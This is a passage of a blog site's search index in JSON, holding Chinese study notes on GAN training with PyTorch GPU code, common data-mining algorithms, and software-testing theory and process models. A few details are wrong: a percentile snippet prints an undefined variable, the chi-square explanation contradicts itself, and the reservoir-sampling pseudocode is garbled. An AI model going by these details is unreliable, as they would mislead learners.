G:2.09 Iter: 4500, D: 0.6834, G:2.19 Iter: 4750, D: 0.5053, G:2.736 Iter: 5000, D: 0.6162, G:2.434 Iter: 5250, D: 0.5765, G:3.15 Iter: 5500, D: 0.6916, G:2.053 Iter: 5750, D: 0.6257, G:2.553 Iter: 6000, D: 0.5586, G:2.937 Iter: 6250, D: 0.7283, G:2.733 Iter: 6500, D: 0.5604, G:3.598 Iter: 6750, D: 0.7311, G:1.48 Iter: 7000, D: 0.5016, G:3.57 Iter: 7250, D: 0.3809, G:3.069 Iter: 7500, D: 0.5193, G:2.837 更改模型的依据： GPU加速： 方法一：直接调用cuda()方法 12345678910real_data = Variable(x).cuda() *#* *真实数据*g_fake_seed = Variable(sample_noise).cuda()fake_images = G_net(g_fake_seed).cuda() *#* *生成的假的数据*D_DC = build_dc_classifier().cuda()for x, _ in train_data: X = X.cuda() 方法二：可以分别调用多块GPU 1234device = torch.device('cuda:0')X = X.to(device)net.to('cuda:0')b=torch.zeros(x.size(0),self.out_num_caps,self.in_num_caps).to('cuda:0')","link":"/2021/07/28/%E5%9F%BA%E4%BA%8E%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%94%9F%E6%88%90%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F/"},{"title":"数据挖掘常用算法","text":"一、数据特征分析与预处理1.1 数据类型1.1.1 数据集类型 结构化数据 大部分的应用将数据存储在关系数据库中，每条记录包含若干个属性。 半结构化数据 半结构化数据也具有一定的结构，但没有像关系型数据库中那样严格的定义，也被称为‘自描述’。半结构化数据使用标签来标识数据中的每个元素。常见的半结构化数据主要有XML文档和JSON数据。 非结构化数据 非结构化数据没有预定义的数据模型 1.1.2 数据属性的类型常见的属性类型 标称属性(Norminal Attribute) 标称属性类似于标签，其中的数学或符号只是用来对物体进行识别和分类，取值往往是枚举类型 分类属性(Categorical) 统计学：定义变量 二元属性(布尔属性)：非对称，如心脏病检测结果 ​ 对称，如性别属性 序数属性(Ordinal Attribute) 有顺序关系，不仅包含了标称属性的全部特征，还能反应对象之间的等级和顺序 如：优、良、中、差 统计学：定序变量 数值属性(Numeric Attribute) 区间标度(Interval Scaled)属性 用相等的单位尺度度量，属性的值有序，可以为正、零或负。相等的数字距离代表所测量的变量相等的数量差值。定距变量（统计学） 如：不能说考90分的同学知识的掌握是考45分同学的2倍：不能说20度比10度高2倍 比率标度属性 如果数值属性存在固定零点，那么属性值之间的比率关系就有意义了，例如：开氏温度、年龄、长度、重量 因存在绝对零点，因此可以进行比率计算，即加减乘除运算。 标称属性、二元属性、序数属性的取值是定性的，不能反应不同等级的差异程度，不能进行加减乘数等数学运算。 标称属性 序数属性 区间标度属性 比率标度属性 频数统计 √ √ √ √ 众数 √ √ √ √ 顺序关系 √ √ √ 中位数 √ √ √ 平均数 √ √ 量化差异 √ √ 加减运算 √ √ 乘除运算 √ 定义”真正零度” √ 1.2 数据的描述性特征1.2.1 描述数据集集中趋势的度量 算数平均数(Arithmetic Mean) 缺点：易受集合中极端值或离群点的影响 中位数(Median) 典型的位置平均数，当数据集合的分布呈现偏斜的时候，采用中位数作为集中趋势的度量更加有效 众数(Mode) 数据呈现多峰分布的时候，中位数也不能有效的描述集中趋势，当数据量较大并且集中趋势比较明显的时候，众数更适合作为描述数据代表性水平的度量 k百分位数(Percentile) 将一组数据从小到大排序，并计算相应的累积百分比，处于k%位置的值称为第k百分位数，用Xk%表示 若Xk%位于第i个与第j个数之间时(i&lt;j)，可以采用几种插值的方法来计算Xk%：线性插值(Linear)、下界(Lower)、上界(Higher)、中点(Midpoint)和最近邻(Nearest) 例子：[-35, 10, 20, 30, 40, 50, 60, 100]求25百分位，即X25% 确定Xk%方法： (n + 1) x k% 1 + (n - 1) x k% 1+(8-1)*25%=2.75介于第2个数与第3个数之间 线性插值：X25%=10+(20-10)*0.75=17.5 下界、上界、中点、最近邻分别为10 20 15 20 1234567import numpy as npX = np.array([-35, 10, 20, 30, 40, 50, 60, 100])k = 25Xk = np.percentile(X, k, interpolation='linear')Nx = X.shape[0]indices = 1 + (Nx - 1) * k / 100.0print(incides, Xk) 四分位数(Quartile) 四分位数是一种特殊的百分位数 第一四分位数Q1，又称“较小四分位数”，即25百分位数 第二四分位数Q2，就是中位数 第一四分位数Q3，又称“较大四分位数”，即75百分位数 四分位数是比较常用的分析数据分布趋势的度量，很多数据可视化方法可以用到。 1.2.2 描述数据离中趋势的度量 极差(Range) 最大值与最小值之差，又称范围误差或全距，R 四分位数极差(InterQuartile Range, IQR) ==IQR = Q3 - Q1== 反映了数据集合中间50%数据的变动范围 超过Q3 +IQR或者低于Q1-IQR可能是离群点 注意：如果数据不服从正态分布，这种方法受数据偏斜程度的影响较大 平均绝对离差 计算数据集合中各个数值与平均的距离(绝对值)总和，然后取其平均数 因存在绝对值，不常用 方差和标准差(Variance and Standard Deviation)不足：大小与数据本身大小密切相关，且带有量纲，不同量纲的数据集合或者刻画对象的不同属性之间难以比较离散程度的大小 离散系数(Coefficient of Variation) 离散系数称为变异系数，样本变异系数是样本标准差与样本平均数之比:$$C_v = \\frac{S}{\\bar{x}}$$注意：离散系数只对由比率标度属性计算出来的数值有意义 1.2.3 数据分布形态的度量 数据的偏态分布及度量 众数在均值左边，大的极端值在右，右向偏态，正偏态 众数在均值右边，大的极端值在左，左向偏态，负偏态 偏态系数 g1 样本偏态系数 SK SK &gt; 0，正偏态 SK &lt; 0，负偏态 |SK| &gt; 1，数据偏态程度很高 0.5 &lt;= |SK| &lt;= 1，偏态程度中等 |SK| &lt; 0.5，认为数据的分布对称 SK越接近0，分布的偏斜程度越小 皮尔逊偏态系数(Pearson’s Coefficient of Skewness)$$Sk_1 = \\frac{\\bar{X}-M_0}{s}$$或$$Sk_2 = \\frac{3(\\bar{X} - M_d)}{s}$$其中，$\\bar{X}$是平均数，$M_0$是众数，$M_d$是中位数，$s$是样本标准差 数据峰度及度量 峰度用于衡量数据分布的平坦度(Flatness)，它以标准正态分布作为比较的基准。峰度的度量使用峰度系数(Kurtosis) K$$K = \\frac{\\frac{1}{n}\\sum_{i=1}^{n}(x_i-\\bar{x})^4}{(\\frac{1}{n}\\sum_{i=1}^{n}(x_i-\\bar{x})^2)^2} - 3$$上述定义被称为超值峰度(Excess Kurtosis)，减3是为了让正态分布的峰度值为0. $K\\approx0$，称为常峰态(Mesokurtic)，接近与正态分布 $K&lt;0$，称为低峰态(Platykurtic) $K&gt;0$，称为高峰态(Leptokurtic) 数据偏度和峰值的作用 1.2.4 数据分布特征的可视化、 箱型图 五数概括法：最小值、Q1、中位数、Q3、最大值 数据偏度和峰度计算与可视化 1.3 数据的相关分析1.3.1 相关分析 散点图 相关系数 协方差：$cov(X,Y)=\\frac{\\sum_{i=1}^n(X_i-\\bar{x})(Y_i-\\bar{Y})}{n-1}$ 协方差的正负表示两个属性相关性的方向，绝对值代表它们之间关系的强弱 不足：协方差的大小与属性的取值范围、量纲都有关系，构成不同的属性对之间的协方差难以进行横向比较。因此将协方差归一化 样本相关系数：$r(X,Y)=\\frac{cov(X,Y)}{S_xS_y}$ S为样本标准差 相关系数的取值：$-1\\le{r}\\le{1}$ 若$0&lt;{r}\\le{1}$，表明X和Y之间存在正线性相关关系 若$-1\\le{r}&lt;{0}$，表明X和Y之间存在负线性相关关系 若$r=0$，表明二者之间不存在线性相关关系，但并不排除二者之间存在非线性相关性。 1.3.2 卡方$(X^2)$检验相关系数可以用来分析两个数值型属性之间的相关性 两个标称属性(分类属性)之间的独立性检验可以使用卡方检验 独立性检验是对两个属性的不同分类的计数进行分析，以判断它们是相互关联，还是彼此独立。 一般是首先建立一个假设，即这两个属性彼此独立而无关联，然后根据这个假设，由实测次数推算出理论次数，再与相应的实测次数比较，求出$X^2$值，最后检验两个属性是否确实彼此独立，从而决定拒绝或接受彼此独立而无关联的假设。 卡方统计量：$X^2 = \\sum\\frac{(Observed - Expected)^2}{Expected}$ $X^2$是统计样本的实际观测值与理论推算值之间的偏离程度。 理论值与实际值之间偏差越大，$X^2$值越大，就越不符合 偏差越小，$X^2$值越大，就越趋于符合 若两值完全相等，$X ^ 2$值为0，表示完全符合 自由度：$dof = (r-1)(c-1)$其中r和c分别为两个属性各自分类值的个数 1.4 数据预处理1.4.1 数据变换、离散化与编码 零均值化(Mean Removal) 给定一个数值型数据集合，将每一个属性的数据都减去这个属性的均值后，形成一个新数据集合，变换后各属性的数据之和与均值都为零，多个属性经过零均值化变换后，都以零为均值分布，各属性的方差不发生变化，各属性的协方差也不发生变化。 应用：对信号数据零均值化，可以消除直流分量的干扰 变换过程：如果将多个属性构成的数据看成是空间中的点，那么经过零均值化的数据就是在空间上进行了平移，分布形状没有发生改变。 Z分数变换 标准分数(Standard Score)也叫z分数(z-score)，用公式表示为：$$z = \\frac{x - \\bar{x}}{s}$$其中$x$为原始数据，$\\bar{x}$为样本均值，$s$为样本标准差，变换后数据的均值为0，方差为1 z值表示原始数据和样本均值之间的距离，以标准差为单位进行计算 应用：当数据的各个属性值范围差异较大，或者挖掘算法假设数据服从正态分布的情况下，z分数变换很有用，如线性回归、逻辑回归以及线性判别分析等算法。 缺点：假如原始数据没有呈高斯分布，标准化的数据分布效果并不好 最大——最小规范化 最大——最小规范化(Min-MAx Normalization)又称离差标准化，是对原始数据的线性转化，将数据按比例缩放到一个特定区间$$v’ = min’ + \\frac{v - min}{max - min}(max’ - min’)$$当多个属性的数值分布区间相差较大时，使用最小——最大规范化可以将这些属性值变换到同一个区间，这对于属性间的比较以及计算对象之间的距离很重要 注意：最小——最大规范化只是对原始数据进行了线性变换，对原始数据经过平移以及缩放操作，方差和均值均会改变，但数据分布形态（直方图）不变。 独热编码 独热编码(One Hot Encoding)又称一位有效编码，用来对标称属性（分类属性）进行编码 独热编码构成的向量较为稀疏。在实际应用中，多采用CSR等压缩形式存储稀疏矩阵。 注意：独热编码的引入有时候会带来数据属性(维数)极大扩张的负面影响 1.4.2 数据抽样技术 不放回简单随机抽样 步骤： 根据待抽样数据的概率，计算以数组形式表示的累计分布概率cdf，并规范化 根据还需要抽样的个数，生成[0, 1]的随机数数组x 将x中的随机数按照cdf值升序找到插入位置，形成索引数组new 找出new中不重复的索引位置，作为本次抽样的位置索引。 在概率数组p中，将已经抽样的索引位置置0 重复上述步骤，直到输出指定数目的样本。 水库抽样 给定一个数据流或者大小未知的数据集合，从中随机抽取k个样本，并使得在数据集合中每个元素被抽中的概率相等 1234567891011Init : a reservoir with the size： k for i= k+1 to N M=random(1, i); if( M &lt; k) SWAP the Mth value and ith value end for 1.4.3 主成分分析主成分分析 Principal Component Analysis 即PCA 是用较少数量的、彼此不相关的综合维度(主成分)来代替原来的维度 如果前m个主成分累计的方差已经占到总体方差的85%以上，那么就可以选择前m个uk(k=1,…,m)作为最终的主成分 可以通过计算原始数据与主成分得分之间的相关性系数，来分析原属性与各个主成分之间的关系 步骤： 将样本数据表示成列向量形式 将X每一行（维）进行零均值化 求样本协方差阵$C=\\frac{1}{n-1}XX^T$ 计算C的特征值$\\lambda_1\\ge\\lambda_2\\ge,…,\\ge\\lambda_p\\ge0$ 计算$F=(UX)^T$ 1.4.4 数据清洗 缺失值填充(Filling in Missing Values) 数据集中不含缺失值的变量(属性)称为完全变量，数据集中含有缺失值的变量(属性)称为不完全变量 数据缺失机制： 完全随机缺失(Missing Completely at Random, MCAR)：数据的缺失与不完全变量以及完全变量都是无关的 随机缺失(Missing at Random, MCAR)：数据的缺失依赖于完全变量，数据缺失与缺失的数据值无关，但与数据在某些属性上的取值有关 非随机缺失(Not Missing at Random, NMAR)在不完全变量中数据的缺失依赖于不完全变量的本身，这种缺失是不可忽略的。 填充缺失值方法 均值填充法 局部均值填充 回归填充法 热卡填充法 平滑噪声 Smoothing Noisy Data 分箱： 等深分箱法 等宽分箱法 最小熵法 用户自定义区间法 局部平滑法： 平均值平滑 边界值平滑 中值平滑 1.5 Spark数据预处理功能简介二、关联规则挖掘2.1 基本概念 根据频繁项集的元素个数k，将频繁项集称为频繁k-项集 支持度计数 设集合T中事务的总数为N，则项集X的支持度定义为： $$sup(X) = \\frac{\\sigma(X)}{N}$$ 最小支持度(minsup) 频繁项集(频繁模式) 关联规则 支持度 关联规则的支持度与项集支持度相同 置信度$$con(A-&gt;B)=\\frac{\\sigma(AUB)}{\\sigma(A)}$$在包含面包的事务中，有75%的人还同时购买了牛奶和奶酪 最小置信度 强关联规则(Strong Association Rule)同时满足最小支持度和最小置信度 过程：首先，通过最小支持度，找到所有的频繁项集；然后，根据最小置信度，过滤频繁项集产生的所有关联规则；最后得到用户可能感兴趣的强关联规则 2.2 基于候选项产生-测试策略的频繁模式挖掘算法2.2.1 Apriori算法 先验原理(Apriori Property)：如果一个项集是频繁的，则它的所有子集一定也是频繁的。 2.2.2 基于划分的算法改进了Apriori算法的性能 将整个事务数据库T的所有记录划分成不相交的子数据库(Partition)：pi。保证每个pi大小合适，能够放到内存的缓冲区中，从而提高访问效率，减少磁盘I/O开销 把每个pi单独扫一遍，得到局部(Locally)的频繁项集。局部频繁项集X的支持度计数需要满足：$\\sigma_i(X)\\ge N_i\\times minsup$ Ni和minsup分别是子数据库Pi的记录数和全局最小支持度阈值 将所有局部频繁项集合并，再扫描一次所有的子数据库，即第二次扫描整体数据库T，从而得到全局频繁项集 2.2.3 事务数据的存储 二元表示存储 垂直数据格式 不足：如果项集的数目很大，比较短的候选项集的数目就会很多，导致tidlist的存储和访问开销增大 2.3 不需要产生候选集的频繁模式挖掘算法FP-Growth算法2.4 结合相关性分析的关联规则支持度——置信度框架 不足：两种商品间存在负面影响时不适用 增加相关性能度量指标 提升度(Lift) 度量名称(Kulczynski) Kulc 度量名称：不平衡因子(Imbalance Ratio ,IR) 2.5 多层关联规则挖掘算法三、分类与回归算法3.1 决策树算法决策树算法是以实例为基础的归纳学习算法，通常用来形成分类器和预测模型，它可以对未知数据进行分类或预测、数据预处理和数据挖掘等。它通常包括两部分：树的生成和树的剪枝 3.1.1 决策树简介决策树类似于流程图的树结构。经过一批训练集的训练产生一棵决策树，决策树上的每个内部节点表示在一个属性上的测试，内部节点的属性称为测试属性。每个分枝则代表一个测试的输出，每个树叶节点代表类（分类标签），即所要学习划分的类。 3.1.2 决策树的类型 分类树：离散变量 回归树：连续变量 不同属性： 决策树内节点的测试属性可以是单变量的，即每个内节点只包含一个属性；也可能是多变量的，例如，多个属性的线性组合，即存在包含多个属性的内节点 每个内节点分支的数量取决于测试属性值的个数。如果每个内节点只有两个分支则称之为二叉决策树 分类结果既可能是两类又可能是多类，如果二叉决策树的结果只能有两类则称之为布尔决策树 3.1.3 决策树的构造过程属性的选择策略就是根据不同的标准来做出选择，而选择的依据则与不确定性有关。 3.1.4 信息论的相关概念 自信息量 信息熵 条件熵 平均互信息量 3.1.5 ID3算法123456输入：训练数据集D输出：决策树T1.如果D中元组的分类属性唯一，返回；2.计算所有非分类属性的信息增益，选择最大的属性A， 为A属性构造中间节点；3.按照属性A的不同取值，对D进行划分，并构造节点A的 分支以及子节点；4.在每个子节点上递归执行ID3算法。 3.1.6 信息论在ID3算法中的应用决策树学习过程就是使得决策树对数据集划分的不确定程度逐渐减小的过程。 3.1.7 C4.5算法C4.5算法继承了ID3算法的所有优点，并对ID3算法进行了改进和补充。C4.5采用信息增益率作为选择分支属性的标准，克服了ID3算法中信息增益偏向选择取值多属性的不足，并能够完成对连续属性离散化的处理 3.1.8 CART算法Classification And Regression Tree 能够处理连续和离散值类型的属性，递归地构造一棵二叉树 https://blog.csdn.net/e15273/article/details/79648502 https://zhuanlan.zhihu.com/p/32003259 3.1.9 过拟合与决策树剪枝预剪枝(Pre-Pruning)常见的预剪枝方法： 定义一个高度，当决策树的高度达到此值时，停止决策树的生长 定义一个阈值，当到达某节点的训练样本个数小于该值时，停止决策树的生长 定义一个阈值，如果当前的分支对系统性能的增益小于该值时，停止决策树的生长 到达某节点的实例具有相同的特征向量，即使实例不属于同一类也停止决策树生长。该方法对于数据冲突问题比较有效。 问题： 很难精确地估计何时停止决策树的生长 预剪枝存在视野效果问题，当前的扩展可能会造成过度拟合训练数据，但更进一步的扩展能够满足要求，也可能准确地拟合训练数据，这将会使得算法过早停止决策树的构造。 后剪枝(Post-Pruning)首先，构造完整的决策树，允许过度拟合训练数据；然后对那些置信度不够的节点子树用叶节点代替。该叶子的类标号设为子树根节点所对应的子集中占数最多的类别。 常见的后剪枝方法： REP(Reduced Error Pruning)——错误率降低剪枝 PEP(Pessimistic Error Pruning)——悲观错误剪枝 CCP(Cost Complexity Pruning)——代价复杂度剪枝 EBP(Error Based Pruning)——基于错误的剪枝 3.2 贝叶斯分类器3.3 基于实例的分类算法3.3.1 KNN分类器KNN K-Nearest Neighbor 过程： 计算距离：给定测试实例，计算出测试实例与训练集中每个样本的距离 寻找近邻：找出与测试实例距离最小的前K个训练样本作为测试实例的K-近邻 确定类别：将K个最近邻的主要归属类别作为测试实例的确定类别 当训练样本集不平衡时，此时占数多的类别更占优势。所以较大的K值能够减少噪声的影响，但会使类别之间的界限变得模糊；但K值过小时，便是取最近的样本点，这样的学习缺少了泛化能力，同时很容易受噪声数据和异常值的影响 K值过大易造成欠拟合，K值过小易造成过拟合 常见的确定K值的方法： 取训练集中样本总数的平方根 根据验证集，通过交叉验证确定K值 KNN算法的实现： 枚举法： 基于索引树结构实现 KD树 K指k维空间 https://zhuanlan.zhihu.com/p/53826008 3.3.2 局部加权回归局部加权回归 Locally Weighted Regression 是一种非参数学习方法，主要思想就是只对预测样本附近的一些样本进行选择，根据这些样本得到的回归方程比较拟合样本数据 步骤： 对于输入x，利用权重高低选择x的邻域训练样本 根据邻域的训练样本求取参数$\\theta$，使其均方差最小 利用参数$\\theta$，得到输入x对应的预测值$\\theta ^Tx$ 对于新输入，重复上述过程 局部加权回归算法的优点： 只需提供平滑参数和局部多项式的阶数便可构造模型，适合没有理论模型基础的复杂建模过程 对训练数据拟合效果较好 对特征的选择依赖程度较小 缺点： 数据的使用效率较低，需要规模较大，采样密集的数据集才能生成好的模型 计算量较大，每次预测都需要扫描所有的数据并重新计算参数 容易出现过拟合现象 3.3.3 基于案例的推理Case Based Reasoning CBR 正则性 典型性 经验性 易适应性 AR模型： Retrieve：案例检索，从案例库中检索到与当前事件最为相似的案例 Reuse：案例重用，检索到的解决方案经重用作为新事 件的建议解决方案 Revise：案例修订，解决方法经测试、评估和修订后得到当前事件最终解决方案 Retain：案例存储，最终解决方案可能与事件一起作为新的案例保存到案例库中，以便使系统具有自增量的学习能力 案例 = 问题的描述 + 相应的解决方案 + 方案的实施效果 3.4 组合分类算法组合分类方法： 个体学习器间不存在强依赖关系，可同时生成的并行化方法：Bagging、随机森林(Random Forest) 个体学习器间存在强依赖关系，必须串行生成的序列化方法:AdaBoost 3.4.1 AdaBoost算法具体流程： 初始化训练数据的权值分布，每个数据所占权重相同，设共有N个训练数据样本，则各个数据所分配权重为1/N 基于当前数据权重分布生成分类器，得出分类器的分类误差率$e$，并选取分类误差率最低的分类器作为新的分类器 利用该分类器的分类误差率$e$计算此分类器在投票决策中所占权重$\\alpha$ 根据该分类器的分类情况调整训练数据的权值分布$\\omega$ 重复步骤2，3直到当前集成学习器的预测误差为0或达到分类器规定的阈值 3.4.2 Bagging算法Bagging是与Boosting思想相对的集成算法。 通过T次采样，对应得到T个采样集 基于每个采样集独立训练出T个弱学习器 通过集合策略将弱学习器集成和升级到强学习器 自主采样法 Bootstraping 平均每个弱学习器只使用了原数据集中63.2%的样本 Bagging与Boosting各自特点 Boosting注重对真实结果的逼近拟合，侧重偏差。降低偏差的方法是不断地修正预测结果与真实值间的距离。Bagging还注重在多个数据集/多种环境下的训练，侧重方差。降低方差的方法就是利用相互交叉的训练集让每个学习器都得到充分的训练 Bagging的训练速度较Boosting更快，其性能依赖于基分类器的稳定性。如果基分类器不稳定，那么Bagging有助于降低训练数据的随机波动导致的误差；如果基分类器稳定，那么集成分类器的误差主要由基分类器的偏倚引起。由于每个弱分类器只使用了原始分类器63.2%的样本，所以Bagging可以适用剩下36.8%的样本作为验证集来对泛化能力进行估计 3.4.3 随机森林3.5 分类器算法的评估 混淆矩阵(Confusion Matrix) 评价指标： 准确率(Accuracy) 精准率(Precision) 召回率(Recall) F1分数(F1-score) ROC曲线与AUC ROC(Receiver Operating Characteristic) 接受者操作特征 AUC(Area Under the Curve) ROC曲线的面积 灵敏度 特异度 3.6 回归分析3.6.1 线性回归评价回归模型的指标： 平均绝对误差(Mean Absolute Error, MAE) 均方误差(Mean Squared Error, MSE) 中值绝对误差(Median Absolute Error, MedAE) 可释方差得分(Explained Variance Score, EVS) $R^2$决定系数(拟合优度, $R^2Score$) 3.6.2 岭回归岭回归是一种改良的最小二乘估计法，通过放弃最小二乘法的无偏性，以损失部分信息、降低精度为代价获得回归系数，它是更为符合实际、更可靠的回归方法，对存在离群点的数据的拟合要强于最小二乘法 3.6.3 多项式回归可以从图像的散点图观察： 存在一个“弯”，考虑用二次多项式 存在两个“弯”，考虑用三次多项式 存在三个“弯”，考虑用四次多项式 依次类推 3.6.4 逻辑回归3.6.5 决策树回归四、聚类算法 聚类：无监督学习 分类：有监督学习 4.2 聚类算法的分类 基于划分的聚类算法 基于层次的聚类算法 基于密度的聚类算法 基于模型的聚类算法 基于网格的聚类算法 4.3 距离度量4.3.1 幂距离Power Distance 4.3.2 欧式距离Euclidean Distance 4.3.3 曼哈顿距离Manhattan Distance 城市街区距离(City Block Distance) 4.3.4 切比雪夫距离Chebyshev Distance 4.3.5 余弦相似度Cosine Similarity 余弦相似度用向量空间中两个向量夹角的余弦值衡量两个个体间差异的大小。相比距离度量，余弦相似度更加注重两个向量在方向上的差异，而非距离或长度。空间中两个对象的属性所构成的向量之间的夹角大小，当方向完全相同，完全相似，相似度为1；当方向完全相反时，完全不相似，相似度为-1.余弦相似度对数值不敏感，侧重于方向上的差异。 4.3.6 兰氏距离Canberra Distance 4.3.7 马氏距离Mahalanobis Distance 4.3.8 斜交空间距离Oblique Space Distance 4.3.9 杰卡德距离Jaccard Distance 4.4 基于划分的聚类算法4.4.1 K均值算法K均值(K-Means)算法的基本思想是，首先随机选取k个点作为初始聚类中心，然后计算各个对象到所有聚类中心的距离，把对象归到离它最近的那个聚类中心所在的类。计算新的聚类中心，如果相邻两次的聚类中心没有任何变化，说明对象调整结束，聚类准则函数已经收敛，至此算法结束 不足： 在K均值算法中k是预先给定的，k值难以估计 常采用误差平方和准则函数作为聚类准则函数，如果各类之间区别明显且数据分布稠密，比较有效。但如果各类的形状和大小差别很大，为使误差平方和最小有可能出现将大的聚类分割的情况。可能会陷入局部最优解 数据量大时，时间开销大 4.4.2 二分K均值聚类算法4.4.3 小批量K均值算法Mini Batch 小批量不使用所有的数据样本，而是从不同聚类的样本中抽取一部分样本来代表各自聚类进行计算，由于计算样本量少，所以会减少运行时间，也必然会带来准确度的下降 4.4.4 K均值++算法核心思想：在选择一个新的聚类中心时，距离已有聚类中心越远的点，被选取作为聚类中心的概率越大 4.4.5 K中心算法K-Medoids算法选用簇中位置最靠近中心的对象，即中心点作为簇的参照点 4.4.6 数据流K均值算法spark 4.5 基于密度的聚类算法","link":"/2021/09/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/"},{"title":"软件测试理论","text":"概念测试原则： 测试证明软件存在缺陷 不能执行穷尽测试 缺陷存在群集现象 某些测试需要依赖特殊的环境 测试应尽早介入 杀虫剂现象：同样的一个测试用例不能重复执行多次，软件会对它产生免疫 不存在缺陷谬论：任何软件都不会是完美的 软件三部分： 功能集合 使用说明书 配置数据 测试对象： 需求分析阶段：各种需求规格说明书 软件架构设计：API接口文档 编码实现阶段：源代码（白盒测试、单元测试） 系统功能使用：软件功能主体（当前行业最多） 测试级别： 单元测试[UT] 组成软件最小的低层代码结构 (类、函数、组件) unit test 集成测试[IT] 多个单元模块组合一起，验证之间沟通的桥梁能否正常工作(接口测试) system ingertation test 系统测试[ST] 测试人员充当用户测试软件功能主体 system test 功能测试 软件主体功能是否可用 兼容性测试 在不同的环境下是否还可以使用 安全测试 是否只是能授权用户提供功能使用 性能测试 相当于当前软件消耗的资源 产出能力 验证测试： α测试 – 内测 β测试 – 公测 γ测试 – 软件版本正式发行的候选版 UAT[ user acceptance test ]测试 – 由客户派出对于业务非常精通的人员来使用该软件，从而对功能进行测试 常用的系统测试方法 按测试对象分类 白盒测试 黑盒测试 灰盒测试 接口测试 按测试对象是否执行 静态测试 测试不执行 动态测试 将软件在真实使用环境进行测试 按测试手段进行分类 手工测试 测试人员手动对被测对象进行验证，测试操作及环境改变灵活 自动化测试 ·自己写脚本 ·第三方工具 软件质量 功能性：软件需要满足用户显式或者稳式的功能 易用性：软件易于学习和上手使用 可靠性：软件必须实现需求当中指明的具体功能 效率性：类似于软件的性能 可维护性：软件具有将某个功能修复之后继续使用的能力 可移植性：可以从一个平台移植到另一个平台上去的能力 软件测试流程 需求分析 当前阶段的核心目的就是梳理清楚我们需要设计的点是什么 需求的来源：需求规格说明书、API文档、竞品分析 设计用例： 用例就是用户为了测试软件的某个功能而执行的操作过程 设计用例是有方法的（等价类、边界值、判定表…） 评审用例：对当前的用例进行添加或删除 配置环境： 环境：当前被测对象运行所需要的执行环境[有一键安装的集成环境] 环境分类：操作系统 + 服务器软件 + 数据库 + 软件低层代码的执行环境 执行用例 冒烟测试，快速的对当前软件的核心功能或主体执行流程进行验证，有问题将此版本回退给开发 冒烟测试通过再开展全面的测试 回归测试及缺陷跟踪 回归测试指的就是当我们将某个缺陷提交给开发之后，由它们进行修复，修复完成后需要测试人员再次对其进行测试 缺陷跟踪：指的是当测试人员发现某个缺陷之后需要一直对其进行状态的跟踪 输出测试报告 产生的数据进行可视化输出 测试结束 将整个测试过程中产生的一些文档整理归纳，方便后续版本使用 开发模型###瀑布模型 说明： 线性模型的一种，在所有模型中占有重要地位，是所有模型的一个基础 每个阶段执行一次，按线性顺序进行软件开发 测试的切入点： ​ - 测试阶段处于软件实现后，必须在代码完成后留出足够的时间给测试活动 优点： 开发的各个阶段比较清晰 强调早期计划及需求调查 适合需求稳定的产品开发 缺点： 依赖于早期的需求调查，不适应需求的变化 单一流程不可逆 风险往往延至后期才暴露，失去及早纠正的机会 问题在项目后期才开始暴露 前面未发现的错误会传递并扩散到后面的阶段，可能导致项目失败 新产品不太适合 改良： 沿用瀑布模型的线性思想，细化各个阶段，在某些重要关注的阶段之间掺入迭代的思想 快速原形模型 在开发真实系统之前，构造一个原型，在原型的基础上，逐渐完成整个系统的开发工作 第一步是建造一个快速原型，实现用户与系统的交互，用户对原型进行评价，进一步细化待开发软件的需求。通过逐步调整原型使其满足用户的要求，开发人员可以确定用户的真正需求是什么 第二步是在第一步的基础上开发出用户满意的软件产品 优点： 克服瀑布模型的缺点，更好地满足用户的需求并减少由于软件需求不明确带来的项目开发风险。适合预先不能确切定义需求的软件系统的开发 缺点： 不适合大型系统的开发（适合开发小型的、灵活性高的系统）。前提是要有一个展示性的产品原型，因此在一定程度上可能会限制开发人员的创新 螺旋模型将开发过程分为几个螺旋周期，每个螺旋周期大致和瀑布模型相符合 优点： 螺旋模型很大程度上是一种风险驱动的方法体系，因为在每个阶段之前及经常发生的循环之前，都必须首先进行风险评估 缺点： 采用螺旋模型需要具有相当丰富的风险评估经验和专门的知识，在风险较大的项目开发中，如果未能及时标识风险，势必造成重大损失。过多的迭代次数会增加开发成本，延迟提交的时间 软件测试模型V模型 优点： 包含了底层测试(单元测试)和高层测试(系统测试)；清楚的标识了开发和测试的各个阶段；自上而下逐步求精，每个阶段分工明确，便于整体项目的把控 缺点： 自上而下的顺序导致了，测试工作在编码之后，就导致错误不能及时的进行修改；实际工作中，需求经常变化，导致v模型步骤，反复执行，返工量很大，灵活度较低 改良： 每个步骤都可以进行小的迭代工作 W模型 优点： 开发强调测试伴随着整个软件开发周期，而且测试的对象不仅仅是程序，需求和概要设计同样要测试 更早地接入测试，可以发现开发初期的缺陷，那么可以用更加低的成本进行缺陷修复 同样是分阶段的工作，便于控制项目过程 缺点： 依赖于软件开发和软件测试依然保持一前一后的线性关系，依然无法支持迭代、自发性和需求等变更调整； 对于当前很多项目，在执行的过程中根本不产生文档，那么W模型基本无法适用 使用起来技术复杂度很高，对于需求和设计的测试要求很高，实践起来困难 H模型 测试流程： 测试准备：所有测试执行活动的准备判断是否到测试就绪点 测试就绪点：测试准入准则，即是否可以开始执行测试的条件 测试执行：具体的执行测试的程序 其他流程： 具体开发中的流程，如：设计流程 优点： 揭示了软件测试除测试执行外，还有很多工作； 软件测试完全独立，贯穿整个生命周期，且与其他流程并发进行； 软件测试活动可以尽早准备、尽早执行，具有很强的灵活性 软件测试可以根据被测物的不同而分层次、分阶段、分次序的执行，同时也是可以被迭代的 缺点： 管理型要求高:由于模型很灵活，必须要定义清晰的规划和管理制度，否则测试过程将非常难以管理和控制 技能要求高：H模型要求能够很好的定义每个迭代的规模，不能太大也不能太小 测试就绪点分析困难：测试很多时候，并不知道测试准备到什么时候是合适的，就绪点在哪里，就绪点的标准是什么，这就对后续的测试执行的启动带来很多困难 对于整个项目组的人员要求非常高：在很好的规划制度下，大家都能高效的工作，否则容易混乱。例如：分了一个小的迭代，但是因为人员技能不足，无效完成，那么整个项目就会受到很大的干扰。 黑盒测试 能发现的错误 功能不对或功能遗漏 界面错误 数据库访问或者处理错误 性能问题 功能测试 逻辑功能测试 界面测试 易用性测试 安装测试 兼容性测试 性能测试 时间性能 空间性能 一般性能测试 稳定性测试 负载测试 压力测试 其他 回归测试、冒烟测试、随机测试、验收测试 测试方法黑盒测试方法（全） 黑盒测试9种常用方法 